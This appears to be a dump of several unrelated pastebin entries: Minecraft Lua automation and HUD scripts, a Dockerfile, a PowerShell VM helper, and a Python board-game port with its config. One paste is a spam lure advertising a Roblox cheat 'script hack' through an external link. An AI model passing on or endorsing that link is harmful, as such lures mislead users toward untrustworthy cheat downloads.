        turtle.up()
        y = y + 1
		print(y.."" up"")
    until y == inputs.y
end
digdown()
turtle.forward()
digdown()"
RU4qrFax,glasses.lua,ComboMaster,Lua,Tuesday 2nd of January 2024 02:01:44 PM CDT,"local component = require(""component"")
local fs = require(""filesystem"")
local computer = require(""computer"")
local bridge = component.openperipheral_bridge
local gpu = component.gpu
local items = {
  {""dwcity:Materia"", 0},
  {""minecraft:iron_ingot"", 0},
  {""DraconicEvolution:draconicIngot"", 0},
}
 
local players = {
  {""cheburek228tr"", false},
  {""combomaster"", false},
}
local chat_box, me, radar, counter
local average, me_a, cb, r = false, false, false, false
-------------{TIME OPTIONS}------------------
local TIME_ZONE = 3 --Ваш часовой пояс
---------------------------------------------
 
---------------------------------------------
local t_correction = TIME_ZONE * 3600
local chat_box_name = ""§8[§4123§8]""
local adm = ""combomaster"" -- Ник админа компа
local allow_mem = falce -- Отображать на экране кол-во памяти или нет
local localize = {
  time = ""§9Время:"",
  join_in_game = "" §7вошел в игру!"",
  left_from_game = "" §7покинул игру!"",
  user_online = ""✓"",
  user_offline = ""✕"",
  near_ME = ""Радар""
}
local colors = {
  item_size = 0x05F5F0, -- кол-во предметов
  eu = 0x5555FF, -- еу/т
  mem = 0xFFFFFF, -- память
  time = 0xFFFF00, --Время
  time_text = 0xFFFF00, -- текст ""Время МСК:""(пример)
  online = 0x008000, --онлайн на очках
  offline = 0xB22222, -- оффлайн на очках
  near = 0xFFFF00, --текст ""Игроки рядом с МЭ""
  players_near = 0xFFFF00, -- цвет игроков рядом
  players = 0x05F5F0 -- цвет игроков в Online/offline 0xFFFFFF
}
--------------------------------------------
local function digital(n)
  local text='123'
  for f in string.gmatch(n,'%d') do text=text..f end
  return text
end
 
function check()
  if component.isAvailable(""average_counter"") then
    average = true
    counter = component.average_counter
  end
  if component.isAvailable(""chat_box"") then
    cb = true
    chat_box = component.chat_box
    chat_box.setName(chat_box_name)
  end
  if component.isAvailable(""me_controller"") then
    me_a = true
    me = component.me_controller
  end
  if component.isAvailable(""radar"") then
    r = true
    radar = component.radar
  end
  componentsOnScreen()
end
 
local function getTimeHost()
  local file = io.open('/tmp/UNIX.tmp', 'w')
  file:write('TIME_ZONE = '..TIME_ZONE)
  file:close()
  local lastmod = tonumber(string.sub(fs.lastModified('/tmp/UNIX.tmp'), 1, -4)) + t_correction
  local dt = os.date('%H:%M:%S', lastmod)
  return dt
end
 
function addBox(x, y, w, h, color, tran)
  bridge.addBox(x, y, w, h, color, tran)
end
 
function addText(x, y, text, color)
  bridge.addText(x, y, text, color)
end
 
function addIcon(x, y, name, meta)
  bridge.addIcon(x, y, name, meta)
end
 
function gui()
  w, h = gpu.maxResolution()
  gpu.fill(1, 1, w, h, "" "")
end
 
function componentsOnScreen()
  gpu.set(1, 1, ""Chat-box: "" .. tostring(cb))
  gpu.set(1, 2, ""ME: "" .. tostring(me_a))
  gpu.set(1, 3, ""Radar: "" .. tostring(r))
  gpu.set(1, 4, ""Counter: "" .. tostring(average))
end
 
function addAllIcons()
  y = 25
  for i = 1, #items do
    y = y + 15
    addIcon(2, y, items[i][1], items[i][2])
  end
end
 
function getSize(name,dmg)
 for _, item in ipairs(me.getItemsInNetwork()) do
  if item.name == name and item.damage == dmg then
   return item.size
  end
 end
 return 0
end
 
function setEnergy()
  addIcon(0, 25, ""AdvancedSolarPanel:BlockMolecularTransformer"", 0)
  if counter.getAverage() / 1000 <= 1 then
    av = string.format(""%.3f"", tostring(counter.getAverage())) .. ""EU/t""
  elseif counter.getAverage() / 1000000 >= 1 then
    av = string.format(""%.3f"", tostring(counter.getAverage() / 1000000)) .. ""MEU/t""
  else
    av = string.format(""%.1f"", tostring(counter.getAverage() / 1000)) .. ""kEU/t""
  end
  addText(25, 27, av, colors.eu)
end
 
function setTime()
  addText(5, 110, localize.time, colors.time_text)
  addText(40, 110, getTimeHost(), colors.time)
end
 
function freeMemory()
  if allow_mem then
    addText(0, 12, ""MEM: ""..math.floor((computer.freeMemory() / 1000))..""mb""..""/""..math.floor((computer.totalMemory() / 1000))..""mb"".."" ""..math.floor(((computer.freeMemory() / computer.totalMemory()) * 100))..""%"", colors.mem)
  end
end
 
function checkOnline(n)
  computer.removeUser(adm)
  if computer.addUser(players[n][1]) then
    computer.removeUser(players[n][1])
    if players[n][2] == false then
      if cb then
        chat_box.say(""§a""..players[n][1] .. localize.join_in_game)
      end
      players[n][2] = true
    end
    return true
  else
    if players[n][2] == true then
      if cb then
        chat_box.say(""§c""..players[n][1] .. localize.left_from_game)
      end
      players[n][2] = false
    end
    computer.removeUser(players[n][1])
    return false
  end
end
 
function drawOnline()
  yy = 120
  for i = 1, #players do
    yy = yy + 10
    if checkOnline(i) then
      addText(5, yy, players[i][1], colors.online)
    else
      addText(5, yy, players[i][1], colors.offline)
    end
  end
end
 
function getPlayersNearME()
  addText(5, 170, localize.near_ME, colors.near)
  a = 180
  temp = radar.getPlayers()
  for i = 1, #temp do
    a = a + 10
    for j = 1, #players do
      if temp[i].name == players[j][1] then
        return
      else
        addText(5, a, temp[i].name.."" ""..math.floor(temp[i].distance).."", ""..""м"", colors.players_near)
      end
    end
  end
end
 
check()
bridge.clear()
addBox(0, 0, 100, 100, 0xFFFFFF, 0)
addAllIcons()
bridge.sync()
gui()
 
while true do
  check()
  computer.addUser(adm)
  bridge.clear()
  if me_a then
    addAllIcons()
    y = 27
    for i = 1, #items do
      y = y + 15
      addText(25, y, getSize(items[i][1], items[i][2]), colors.item_size)
    end
  end
  if average then
    setEnergy()
  end
  setTime()
  drawOnline()
  bridge.addBox(0,100,100,170,0x000000,0.2)
  freeMemory()
  if r then
    getPlayersNearME()
  end
  os.sleep(0.001)
  bridge.sync()
end"
trgBxHz4,Untitled,Maliuga,Bash,Tuesday 2nd of January 2024 01:50:54 PM CDT,"# Не просто создаём образ, но даём ему имя build
FROM gcc:11.3 as build

RUN apt update && \
    apt install -y \
      python3-pip \
      cmake \
    && \
    pip3 install conan==1.*

# Запуск conan как раньше
COPY conanfile.txt /app/
RUN mkdir /app/build && cd /app/build && \
    conan install --build missing -s compiler.libcxx=libstdc++11 -s build_type=Debug ..

# Папка data больше не нужна
COPY ./src /app/src
COPY ./tests /app/tests
COPY CMakeLists.txt /app/

RUN cd /app/build && \
    cmake -DCMAKE_BUILD_TYPE=Debug .. && \
    cmake --build .
    

# Второй контейнер в том же докерфайле
FROM ubuntu:22.04 as run

# Создадим пользователя www
RUN groupadd -r www && useradd -r -g www www
USER www

# Скопируем приложение со сборочного контейнера в директорию /app.
# Не забываем также папку data, она пригодится.
COPY --from=build /app/build/game_server /app/
COPY ./data /app/data
COPY ./static /app/static

# Запускаем игровой сервер
ENTRYPOINT [""/app/game_server"", ""-c"", ""/app/data/config.json"", ""-w"", ""/app/static/"", ""--randomize-spawn-points""]
"
P7T4NXbi,Toilet Tower Defense Script Pastebin 2024,Artani,Lua,Tuesday 2nd of January 2024 01:50:12 PM CDT,"TTD SCRIPT 2024 (TOILET TOWER DEFENSE SIMULATOR SCRIPT HACK 2024 PASTEBIN PC + MOBILE)
https://artanisrbx.com/roblox-toilet-tower-defense-simualtor-script/
COPY LINK INTO BROWSER"
KuDnJCQV,Get-VMIPAddress,PureGremlin,PowerShell,Tuesday 2nd of January 2024 01:00:17 PM CDT,"function Get-VMIPaddress($IP) {
$vm=get-vm * | ? {$_.Guest.IPaddress -match $IP}| Get-NetworkAdapter
$vm | select-object Parent,Name,MacAddress
}"
YaB2Khy4,pos_slave,dataclear,Lua,Tuesday 2nd of January 2024 12:43:41 PM CDT,"-- Config
-- movement direction
dir = ""z""
-- position offset
pos_offset = 0
-- 
debug = false

progName = ""GPS Chunky Slave""
REDNET_PROTOCOL = ""mining_gps_location""

posNeg = nil
targetCoord = nil
currentCoord = nil


status = {}
status[""Offset""] = pos_offset
peripheral.find(""modem"", rednet.open)
 
function printDebug(msg)
 
    if debug then
        print(msg)
    end
 
end
 
 
function displayStatus()
 
    term.clear()
    term.setCursorPos(1,1)
    
    local maxLen = 0
    
    for k, v in  pairs(status)
    do
        maxLen = math.max(7, maxLen, string.len(k))        
    end
    firstLine = ""Program""
    firstLine = firstLine .. string.rep("" "", maxLen - 7)
    firstLine = firstLine .. "": ""
    firstLine = firstLine .. progName
    print(firstLine)
    print(""-----------"")
    
    for k, v in pairs(status) 
    do
        local line = """"
        line = line .. k
        line = line .. string.rep("" "", maxLen - string.len(k))
        line = line .. "": ""
        line = line .. v
        print(line)
    end
    
end
 
function getCurrentPos()
 
    local x, y, z = gps.locate()
    status[""Pos""] = x .. "", "" .. y .. "", "" .. z
    printDebug(""locating coord"")
    if dir == ""x"" then
      currentCoord  = x
    elseif dir == ""z"" then
      currentCoord  = z
    end
 
end

function getTargetPos()
 
  id, msg = rednet.receive(REDNET_PROTOCOL)
  targetCoord = tonumber(msg)
  status[""Target""] = targetCoord

end
 
function checkFuel()
 
    status[""Fuel""] = turtle.getFuelLevel()
    if status[""Fuel""] < 10 then
        printDebug(""refuelling"")
    
        for i=1, 16, 1
        do
            turtle.select(i)
            is_fuel = turtle.refuel(0)
            if is_fuel == true then
                printDebug(""refuel from slot "" .. i)
                turtle.refuel(1)
                return
            end
        end
    
    end
 
end
 
function moveForward()
 
    getCurrentPos()
    local startPos = currentCoord
    checkFuel()
    turtle.forward()
    getCurrentPos()
    local endPos = currentCoord
    posNeg = endPos - startPos 
    printDebug(""moved to "" .. dir .. "" "" .. currentCoord) 
 
end

function moveBack()
 
  checkFuel()
  turtle.back()
  getCurrentPos()
  printDebug(""moved to "" .. dir .. "" "" .. currentCoord) 

end

function checkMove()

  -- check if posNeg is entered, move back/forward to calculate if nill
  if posNeg == nil then
    moveBack()
    moveForward()
  end

  posDifference = targetCoord - currentCoord - pos_offset

  if posDifference < 0 and posNeg < 0 then
    moveForward()
  elseif posDifference > 0 and posNeg > 0 then
    moveForward()
  elseif posDifference < 0 and posNeg > 0 then
    moveBack()
  elseif posDifference > 0 and posNeg < 0 then
    moveBack()
  end

end

 
getCurrentPos()
 
while true
do
 
  getCurrentPos()
  getTargetPos()
  checkMove()
  displayStatus() 
  sleep(1)
 
end"
6HgyHnin,deepSpaceD6.py,angeldp,Python,Tuesday 2nd of January 2024 12:36:18 PM CDT,"# -*- coding: utf-8 -*-
""""""
deepSpaceD6.py

Python version of 'Deep Space D-6' game

Created on Wed Dec 27 20:25:12 2023

@author:
""""""
# IMPORTS
import configparser
from main.ds_main_functions import main_program


file = ""config.ini""
config = configparser.ConfigParser()
config.read(file)
ncards = config.getint('mode', 'duration')
level = config.get('mode', 'level')
space_ship = config.get('ships', 'ship')
if space_ship == ""halcyon"":
    ship = [8, 4]
elif space_ship == ""athena"":
    ship = [5, 6]
elif space_ship == ""AG-8"":
    ship = [10, 2]
elif space_ship == ""mononoaware"":
    ship = [5, 5]
else:
    space_ship = ""Unknown""
    ship = [8, 4]
deck = list(range(0, ncards))
scant = 0
crewn = 6
print(f'Wellcome to the ship «{ship}»')
print(f'You have chosen the {level} mode')
main_program(ship, deck, scant, crewn)
exit(0)
"
HFERhda5,config.ini,angeldp,INI file,Tuesday 2nd of January 2024 12:13:53 PM CDT,"[mode]
; Available durations:
; 5: test, 5 cards
; 34: fast, 34 cards
; 37: short, 37 cards
; 42: normal, 42 cards
duration=5

; Available levels:
; 6: easiest, 6 Don't panic cards
; 5: easy, 5 Don't panic cards
; 3: medium, 3 Don't panic cards
; 0: hard, 0 Don't panic cards
level=0

[ships]
; Available ships:
; halcyon -> The Halcyon: hull(8), shield(4)
; athena -> The Athena Mk. II: hull(5), shield(6)
; AG-8 -> The AG-8: hull(10), shield(2)
; mononoaware -> The Mononoaware: hull(5), shield(5)
ship=halcyon"
mtiTCVaD,Ether lib,sigmasoldier,Lua,Tuesday 2nd of January 2024 11:59:20 AM CDT,"
package.preload[""result""] = function()
-- Generated by the Saturnus compiler 1.0
-- WARNING! Changes may be discarded at any moment!
local __saturnus_spread__ = table.unpack or unpack; -- Lua polyfill
local trait, impl, abstract;
do
  local __destructure__ = require(""std"");
  trait = __destructure__.trait;
  impl = __destructure__.impl;
  abstract = __destructure__.abstract;
end
local Result = {};
Result.__meta__ = {};
Result.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Result.prototype = {};
Result.prototype.__proto__ = Result;
Result.prototype.__meta__ = {};
Result.prototype.__meta__.__index = Result.prototype;
setmetatable(Result, Result.__meta__);
Result.prototype.unwrap = function(self)
  return 0;
end;
abstract()(Result.prototype.unwrap, ""unwrap"", Result, ""Result"", { is_static = false });
Result.prototype.unwrap_err = function(self)
  return 0;
end;
abstract()(Result.prototype.unwrap_err, ""unwrap_err"", Result, ""Result"", { is_static = false });
Result.prototype.is_err = function(self)
  return 0;
end;
abstract()(Result.prototype.is_err, ""is_err"", Result, ""Result"", { is_static = false });
Result.prototype.is_ok = function(self)
  return 0;
end;
abstract()(Result.prototype.is_ok, ""is_ok"", Result, ""Result"", { is_static = false });
trait()(Result, ""Result"");
local value_symbol = {};
local Ok = {};
Ok.__meta__ = {};
Ok.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Ok.prototype = {};
Ok.prototype.__proto__ = Ok;
Ok.prototype.__meta__ = {};
Ok.prototype.__meta__.__index = Ok.prototype;
setmetatable(Ok, Ok.__meta__);
Ok.new = function(value)
  return Ok({[value_symbol] = value});
end;
Ok.prototype.unwrap = function(self)
  return self[value_symbol];
end;
Ok.prototype.unwrap_err = function(self)
  return error(""Attempting to unwrap error from Ok value"");
end;
Ok.prototype.is_err = function(self)
  return false;
end;
Ok.prototype.is_ok = function(self)
  return true;
end;
impl(Result)(Ok, ""Ok"");
local Err = {};
Err.__meta__ = {};
Err.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Err.prototype = {};
Err.prototype.__proto__ = Err;
Err.prototype.__meta__ = {};
Err.prototype.__meta__.__index = Err.prototype;
setmetatable(Err, Err.__meta__);
Err.new = function(value)
  return Err({[value_symbol] = value});
end;
Err.prototype.unwrap = function(self)
  local e = self[value_symbol];
  print(e);
  if type(e) == ""table"" and type(e.to_string) == ""function"" then
    error(""Unwrap error! "" .. tostring(e.to_string(e)));
  elseif e ~= nil then
    error(""Unwrap error! "" .. tostring(e));
  end
  error(""Attempting to unwrap an Err value"");
end;
Err.prototype.unwrap_err = function(self)
  return self[value_symbol];
end;
Err.prototype.is_err = function(self)
  return true;
end;
Err.prototype.is_ok = function(self)
  return false;
end;
impl(Result)(Err, ""Err"");
return {Ok = Ok.new, Err = Err.new, Result = Result};
end;
package.preload[""tokio""] = function()
-- Generated by the Saturnus compiler 1.0
-- WARNING! Changes may be discarded at any moment!
local __saturnus_spread__ = table.unpack or unpack; -- Lua polyfill
local Ok, Err;
do
  local __destructure__ = require(""result"");
  Ok = __destructure__.Ok;
  Err = __destructure__.Err;
end
local yield = coroutine.yield;
local Promise = {};
Promise.__meta__ = {};
Promise.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Promise.prototype = {};
Promise.prototype.__proto__ = Promise;
Promise.prototype.__meta__ = {};
Promise.prototype.__meta__.__index = Promise.prototype;
setmetatable(Promise, Promise.__meta__);
Promise.prototype.resolved = false;
Promise.prototype.rejected = false;
Promise.new = function(handler)
  local promise = Promise({});
  local resolve = function(value)
    promise.resolved = true;
    promise.value = value;
  end;
  local reject = function(value)
    promise.rejected = true;
    promise.error = value;
  end;
  handler(resolve, reject);
  return promise;
end;
Promise.prototype.on_resolve = function(self, after)
  return Promise.new(function(r)
    local res = await(self);
    r(after(res));
  end);
end;
Promise.prototype.await = function(self)
  while true do
    if self.rejected then
      return Err(self.error);
    elseif self.resolved then
      return Ok(self.value);
    end
    yield();
  end
end;
local function count(tbl)
  local i = 0;
  for _ in pairs(tbl) do
    i = i + 1;
  end
  return i;
end
local Ev = {};
Ev.__meta__ = {};
Ev.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Ev.prototype = {};
Ev.prototype.__proto__ = Ev;
Ev.prototype.__meta__ = {};
Ev.prototype.__meta__.__index = Ev.prototype;
setmetatable(Ev, Ev.__meta__);
Ev.prototype.should_exit = false;
Ev.new = function()
  return Ev({listener_table = {}, coroutines = {}});
end;
Ev.prototype.exit = function(self, panic_reason)
  self.panic_reason = panic_reason;
  self.should_exit = true;
end;
Ev.prototype.on = function(self, event, handler)
  if self.listener_table[event] == nil then
    self.listener_table[event] = {};
  end
  self.listener_table[event][handler] = true;
  return function()
    return self:off(event, handler);
  end;
end;
Ev.prototype.off = function(self, event, handler)
  if self.listener_table[event] == nil then
    return;
  end
  if not self.listener_table[event][handler] then
    return;
  end
  self.listener_table[event][handler] = nil;
  if count(self.listener_table[event]) <= 0 then
    self.listener_table[event] = nil;
  end
end;
Ev.prototype.once = function(self, event, handler)
  local wrapper;
  wrapper = function(...)
    local args = {...};
    self:off(event, wrapper);
    handler(__saturnus_spread__(args));
  end;
  return self:on(event, wrapper);
end;
Ev.prototype.push = function(self, event, ...)
  local args = {...};
  os.queueEvent(event, __saturnus_spread__(args));
end;
Ev.prototype.run = function(self, target)
  if type(target) == ""function"" then
    local co = coroutine.create(target);
    self.coroutines[co] = co;
  end
  while true do
    if self.should_exit then
      if self.panic_reason ~= nil then
        error(self.panic_reason);
      else
        return nil;
      end
    end
    local event_info = {os.pullEvent()};
    if count(event_info) > 0 then
      self:_fire_listeners(event_info[1], event_info);
      self:_fire_listeners(""*"", event_info);
    end
    for co in pairs(self.coroutines) do
      if coroutine.status(co) == ""dead"" then
        self.coroutines[co] = nil;
      else
        local ok, err;
        do
          local __destructure__ = {coroutine.resume(co)};
          ok = __destructure__[1];
          err = __destructure__[2];
        end
        if not ok then
          self:exit(err);
        end
      end
    end
  end
end;
Ev.prototype._fire_listeners = function(self, target, info)
  if self.listener_table[target] ~= nil then
    for handler in pairs(self.listener_table[target]) do
      handler(__saturnus_spread__(info));
    end
  end
end;
Ev.prototype.launch = function(self, thread)
  local co = coroutine.create(thread);
  self.coroutines[co] = co;
end;
Ev.prototype.timeout = function(self, callback, time)
  time = time == nil and 0 or time;
  local clean;
  local timer_id;
  clean = self:on(""timer"", function(_, id)
    if id == timer_id then
      clean();
      callback();
    end
  end);
  timer_id = os.startTimer(time);
  return clean;
end;
Ev.prototype.timeout_promise = function(self, time)
  return Promise.new(function(r)
    return self:timeout(r, time);
  end);
end;
local ev = Ev.new();
local function tokio(alt_ev)
  return function(target)
    alt_ev = alt_ev == nil and ev or alt_ev;
    alt_ev:run(target);
  end;
end
return {tokio = tokio, yield = yield, Promise = Promise, Ev = Ev, ev = ev};
end;
package.preload[""tokio.result""] = function()
-- Generated by the Saturnus compiler 1.0
-- WARNING! Changes may be discarded at any moment!
local __saturnus_spread__ = table.unpack or unpack; -- Lua polyfill
local trait, impl, abstract;
do
  local __destructure__ = require(""std"");
  trait = __destructure__.trait;
  impl = __destructure__.impl;
  abstract = __destructure__.abstract;
end
local Result = {};
Result.__meta__ = {};
Result.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Result.prototype = {};
Result.prototype.__proto__ = Result;
Result.prototype.__meta__ = {};
Result.prototype.__meta__.__index = Result.prototype;
setmetatable(Result, Result.__meta__);
Result.prototype.unwrap = function(self)
  return 0;
end;
abstract()(Result.prototype.unwrap, ""unwrap"", Result, ""Result"", { is_static = false });
Result.prototype.unwrap_err = function(self)
  return 0;
end;
abstract()(Result.prototype.unwrap_err, ""unwrap_err"", Result, ""Result"", { is_static = false });
Result.prototype.is_err = function(self)
  return 0;
end;
abstract()(Result.prototype.is_err, ""is_err"", Result, ""Result"", { is_static = false });
Result.prototype.is_ok = function(self)
  return 0;
end;
abstract()(Result.prototype.is_ok, ""is_ok"", Result, ""Result"", { is_static = false });
trait()(Result, ""Result"");
local value_symbol = {};
local Ok = {};
Ok.__meta__ = {};
Ok.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Ok.prototype = {};
Ok.prototype.__proto__ = Ok;
Ok.prototype.__meta__ = {};
Ok.prototype.__meta__.__index = Ok.prototype;
setmetatable(Ok, Ok.__meta__);
Ok.new = function(value)
  return Ok({[value_symbol] = value});
end;
Ok.prototype.unwrap = function(self)
  return self[value_symbol];
end;
Ok.prototype.unwrap_err = function(self)
  return error(""Attempting to unwrap error from Ok value"");
end;
Ok.prototype.is_err = function(self)
  return false;
end;
Ok.prototype.is_ok = function(self)
  return true;
end;
impl(Result)(Ok, ""Ok"");
local Err = {};
Err.__meta__ = {};
Err.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Err.prototype = {};
Err.prototype.__proto__ = Err;
Err.prototype.__meta__ = {};
Err.prototype.__meta__.__index = Err.prototype;
setmetatable(Err, Err.__meta__);
Err.new = function(value)
  return Err({[value_symbol] = value});
end;
Err.prototype.unwrap = function(self)
  local e = self[value_symbol];
  print(e);
  if type(e) == ""table"" and type(e.to_string) == ""function"" then
    error(""Unwrap error! "" .. tostring(e.to_string(e)));
  elseif e ~= nil then
    error(""Unwrap error! "" .. tostring(e));
  end
  error(""Attempting to unwrap an Err value"");
end;
Err.prototype.unwrap_err = function(self)
  return self[value_symbol];
end;
Err.prototype.is_err = function(self)
  return true;
end;
Err.prototype.is_ok = function(self)
  return false;
end;
impl(Result)(Err, ""Err"");
return {Ok = Ok.new, Err = Err.new, Result = Result};
end;
_G[""__saturnus_module_std""] = function()
  -- Generated by the Saturnus compiler 1.0
-- WARNING! Changes may be discarded at any moment!
local __saturnus_spread__ = table.unpack or unpack; -- Lua polyfill
local function panic(message)
  -- <extern ""Lua""> --
    error(message);
  -- </extern> --
end
local private = {};
local Vector = {};
Vector.__meta__ = {};
Vector.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Vector.prototype = {};
Vector.prototype.__proto__ = Vector;
Vector.prototype.__meta__ = {};
Vector.prototype.__meta__.__index = Vector.prototype;
setmetatable(Vector, Vector.__meta__);
Vector.new = function(data)
  return Vector({[private] = {data = data}});
end;
Vector.prototype.at = function(self, key)
  return self[private].data[key + 1];
end;
Vector.prototype.set = function(self, key, value)
  self[private].data[key] = value;
end;
Vector.prototype.pop = function(self)
  if self.len() > 0 then
    local value = self[private].data[#self[private].data];
    self[private].data[#self[private].data] = nil;
    return value;
  end
  return nil;
end;
Vector.prototype.push = function(self, value)
  self[private].data[#self[private].data + 1] = value;
end;
Vector.prototype.len = function(self)
  return #self[private].data;
end;
Vector.prototype.iter = function(self)
  return Object.entries(self[private].data);
end;
local Object = {};
Object.__meta__ = {};
Object.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Object.prototype = {};
Object.prototype.__proto__ = Object;
Object.prototype.__meta__ = {};
Object.prototype.__meta__.__index = Object.prototype;
setmetatable(Object, Object.__meta__);
Object.entries = function(tbl)
  -- <extern ""Lua""> --
      do
        local iter = pairs(tbl);
        return function(_, next)
          local k, v = iter(tbl, next and next._0);
          if k ~= nil and v ~= nil then
            return { _0 = k, _1 = v }, v;
          end
        end;
      end
    -- </extern> --
  panic(""Object.entries() not supported on this platform!"");
end;
Object.keys = function(tbl)
  -- <extern ""Lua""> --
      do
        return pairs(tbl);
      end
    -- </extern> --
  panic(""Object.keys() not supported on this platform!"");
end;
local Tuple = {};
Tuple.__meta__ = {};
Tuple.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Tuple.prototype = {};
Tuple.prototype.__proto__ = Tuple;
Tuple.prototype.__meta__ = {};
Tuple.prototype.__meta__.__index = Tuple.prototype;
setmetatable(Tuple, Tuple.__meta__);
Tuple.new = function(data)
  return Vector({[private] = {data = data}});
end;
Tuple.prototype.at = function(self, key)
  return self[private].data[key];
end;
Tuple.prototype.set = function(self, key, value)
  self[private].data[key] = value;
end;
Tuple.prototype.len = function(self)
  return #self[private].data;
end;
Tuple.prototype.iter = function(self)
  return Object.entries(self[private].data);
end;
local ext = (function()
  local function split(sep)
    return function(self)
      sep = sep == nil and ""%s"" or sep;
      local t = {};
      for frag in self:gmatch(""([^"" .. sep .. ""]+)"") do
        t[#t + 1] = frag;
      end
      return t;
    end;
  end
  local function join(sep)
    return function(self)
      return table.concat(self, sep);
    end;
  end
  local function map(f)
    return function(self)
      local t = {};
      for __destructured_iterator_target__ in Object.entries(self) do
        local k, v;
        do
          local __destructure__ = __destructured_iterator_target__;
          k = __destructure__._0;
          v = __destructure__._1;
        end
        t[k] = f(v, k, self);
      end
      return t;
    end;
  end
  local function reduce(f, seed)
    return function(self)
      for __destructured_iterator_target__ in Object.entries(self) do
        local k, v;
        do
          local __destructure__ = __destructured_iterator_target__;
          k = __destructure__._0;
          v = __destructure__._1;
        end
        seed = f(seed, v, k, self);
      end
      return seed;
    end;
  end
  return {split = split, join = join, map = map, reduce = reduce};
end)();
local rtti = {};
rtti.__meta__ = {};
rtti.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
rtti.prototype = {};
rtti.prototype.__proto__ = rtti;
rtti.prototype.__meta__ = {};
rtti.prototype.__meta__.__index = rtti.prototype;
setmetatable(rtti, rtti.__meta__);
rtti.arguments = function(...)
  local args = {...};
  return function(target, name)
  end;
end;
local makeTrait = function(name)
  return function()
    return panic(""Trait "" .. name .. "" is not constructible!"");
  end;
end;
local function trait()
  return function(target, name)
    target.__meta__.__call = makeTrait(name);
  end;
end
local function impl(trait)
  return function(target, name)
    local map = {};
    for __destructured_iterator_target__ in Object.entries(target.prototype) do
      local k, v;
      do
        local __destructure__ = __destructured_iterator_target__;
        k = __destructure__._0;
        v = __destructure__._1;
      end
      map[k] = v;
    end
    for __destructured_iterator_target__ in Object.entries(trait.prototype) do
      local k, v;
      do
        local __destructure__ = __destructured_iterator_target__;
        k = __destructure__._0;
        v = __destructure__._1;
      end
      if map[k] == nil then
        panic(name .. "" must implement trait method "" .. k .. ""!"");
      end
    end
  end;
end
local function mixin(parent)
  local index = parent.prototype.__meta__.__index;
  if type(index) == ""table"" then
    index = function(self, key)
      return parent.prototype.__meta__.__index[key];
    end;
  end
  return function(target, name)
    local prev = target.prototype.__meta__.__index;
    if type(prev) == ""table"" then
      local prev_tbl = prev;
      prev = function(self, key)
        return prev_tbl[key];
      end;
    end
    target.prototype.__meta__.__index = function(self, key)
      return prev(self, key) or index(self, key);
    end;
  end;
end
local makePure = function(name)
  return function()
    return panic(""Attempting to call abstract method "" .. name .. ""!"");
  end;
end;
local function abstract()
  return function(_, name, host, label, meta)
    if meta.is_static then
      host[name] = makePure(label .. ""::"" .. name);
    else
      host.prototype[name] = makePure(label .. ""."" .. name);
    end
  end;
end
local function __saturnus_operator_pipe_greater(left, right)
  return right(left);
end
local function __saturnus_operator_less_pipe(left, right)
  return left(right);
end
local function __saturnus_operator_colon_colon(arr, elem)
  -- <extern ""Lua""> --
    do
      table.insert(arr, elem);
      return arr;
    end
  -- </extern> --
  panic(""Operator :: not supported on this platform"");
end
local function __saturnus_operator_colon_colon_colon(left, right)
  -- <extern ""Lua""> --
    do
      local tbl = {};
      for _, v in pairs(left) do
        tbl[#tbl + 1] = v;
      end
      for _, v in pairs(right) do
        tbl[#tbl + 1] = v;
      end
      return tbl;
    end
  -- </extern> --
  panic(""Operator ::: not supported on this platform"");
end
local function __saturnus_operator_plus_interrogation(left, right)
  return left and (left + right);
end
local function __saturnus_operator_plus_interrogation_interrogation(left, right)
  return left and (left + right) or right;
end
local function __saturnus_operator_plus_plus_interrogation(left, right)
  return left and (left .. right);
end
local function __saturnus_operator_plus_plus_interrogation_interrogation(left, right)
  return left and (left .. right) or right;
end
local function __saturnus_operator_minus_interrogation(left, right)
  return left and (left - right);
end
local function __saturnus_operator_minus_interrogation_interrogation(left, right)
  return left and (left - right) or right;
end
local function __saturnus_operator_times_interrogation(left, right)
  return left and (left * right);
end
local function __saturnus_operator_times_interrogation_interrogation(left, right)
  return left and (left * right) or right;
end
local function __saturnus_operator_slash_interrogation(left, right)
  return left and (left / right);
end
local function __saturnus_operator_slash_interrogation_interrogation(left, right)
  return left and (left / right) or right;
end
local function forward_iterator(from, to, step)
  local i = from;
  return function()
    if i > to then
      return nil;
    end
    local c = i;
    i = i + step;
    return c;
  end;
end
local function backward_iterator(from, to, step)
  local i = from;
  return function()
    if i < to then
      return nil;
    end
    local c = i;
    i = i - step;
    return c;
  end;
end
local function __saturnus_operator_dot_dot(from, target)
  local to, step;
  do
    local __destructure__ = (function()
      if type(target) == ""table"" then
        return target;
      end
      return {_0 = target, _1 = 1};
    end)();
    to = __destructure__._0;
    step = __destructure__._1;
  end
  if from < to then
    return forward_iterator(from, to, step);
  end
  return backward_iterator(from, to, step);
end
local function __saturnus_operator_minus_greater_greater(self, method)
  return method(self);
end
